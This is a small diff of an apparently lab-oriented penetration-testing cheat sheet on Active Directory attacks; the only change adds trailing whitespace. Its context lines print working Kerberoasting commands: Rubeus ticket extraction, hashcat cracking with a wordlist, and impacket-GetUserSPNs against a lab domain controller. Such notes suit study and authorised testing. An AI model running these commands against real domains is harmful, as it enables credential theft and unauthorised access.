@@ -1201,7 +1201,7 @@ Login to DC
     `PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast`  
   - crack the hash **13100 hashes.kerberoast**  
     `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
-  - Alternate tool - impacket-GetUserSPNs
+  - Alternate tool - impacket-GetUserSPNs  
     `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`  
 - AS-REP roast (accounts without preauth)
   - **DC1 pete**  
